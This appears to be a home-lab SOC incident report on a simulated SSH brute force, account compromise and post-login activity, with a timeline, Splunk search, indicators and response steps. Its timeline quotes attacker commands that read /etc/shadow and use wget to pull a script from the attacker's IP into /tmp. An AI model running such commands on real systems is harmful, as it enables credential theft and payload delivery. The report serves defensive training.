# Incident Report IR-001: SSH Brute Force Leading to Account Compromise

| | |
|---|---|
| **Host** | soc-lab-web01 |
| **Severity** | Critical |
| **Status** | Contained (lab exercise) |
| **Analyst** | Vijayalaxmi Kummari |
| **Detections triggered** | SSH Brute Force, Successful Login After Brute Force, Suspicious Sudo Command |
| **MITRE ATT&CK** | T1110.001, T1078, T1548.003, T1003.008, T1105 |

> This incident took place in my home lab using simulated logs. The attacker IP is from a reserved documentation range. Exact times will differ each time the generator runs; the sequence and gaps between events stay the same.

## Summary

An external IP address, `203.0.113.45`, made 45 failed SSH login attempts against the `admin` account in roughly 90 seconds, then logged in successfully. Within a minute of that login, the `backup` account used sudo to read `/etc/shadow` and download a shell script from the attacker's IP to `/tmp`. The pattern points to a successful password-guessing attack followed by credential theft and an attempt to bring in further tooling.

## Timeline

| Relative time | Event | Source |
|---|---|---|
| T+0s | First failed SSH login for `admin` from 203.0.113.45 | auth.log |
| T+0s to T+90s | 45 failed logins, all for `admin`, from the same IP | auth.log |
| T+92s | **Accepted password for `admin` from 203.0.113.45** | auth.log |
| T+132s | `backup` runs `sudo /bin/cat /etc/shadow` | auth.log |
| T+147s | `backup` runs `sudo /usr/bin/wget http://203.0.113.45/x.sh -O /tmp/x.sh` | auth.log |

## Analysis

1. **Initial alert.** *SSH Brute Force* fired for 203.0.113.45 with 45 failures against a single username. A single targeted account suggests the attacker already knew the username `admin` existed, rather than spraying common names.
2. **Escalation to critical.** *Successful Login After Brute Force* fired for the same IP. Combined with the failure count, this is very unlikely to be a legitimate user and I treated `admin` as compromised.
3. **Post-compromise activity.** Searching all activity on the host after the successful login showed two sudo commands from `backup`, an account that does not normally run sudo on this server:
   - Reading `/etc/shadow` gives the attacker password hashes for every local account, which they can crack offline (T1003.008).
   - Downloading `x.sh` from the attacker's own IP is ingress tool transfer (T1105) and probably the next stage, such as a backdoor or crypto miner.
4. **Scope.** No other hosts are in the lab, so lateral movement was not possible. In a real environment I would search for 203.0.113.45 and for logins by `admin` and `backup` across every host.

Search used to build the timeline:

```spl
index=soc_lab (src_ip="203.0.113.45" OR sudo_user="backup" OR "203.0.113.45")
| table _time sourcetype action user src_ip sudo_user sudo_command
| sort _time
```

## Indicators of compromise

| Type | Value |
|---|---|
| IP address | 203.0.113.45 |
| URL | http://203.0.113.45/x.sh |
| File path | /tmp/x.sh |
| Accounts | admin (credentials compromised), backup (used for privilege escalation) |

## Recommended response

**Contain**
- Block 203.0.113.45 at the firewall.
- Disable the `admin` and `backup` accounts and end their active sessions.
- Isolate soc-lab-web01 from the network until it has been checked.

**Eradicate**
- Collect `/tmp/x.sh` for analysis, then remove it. Check cron jobs, `~/.ssh/authorized_keys` and systemd services for persistence.
- Reset passwords for every local account, since the shadow file was read.

**Recover and improve**
- Disable SSH password authentication and use key-based login only.
- Add fail2ban or an equivalent to lock out IPs after repeated failures.
- Restrict SSH access to known management IP ranges.
- Review why `backup` had sudo rights and remove them if not needed.

## Lessons learned

Each alert on its own told part of the story. Correlating the brute force, the successful login and the sudo commands on a single timeline is what showed this was a compromise rather than background internet noise. A combined correlation rule would raise one critical alert for the whole chain instead of three separate ones.
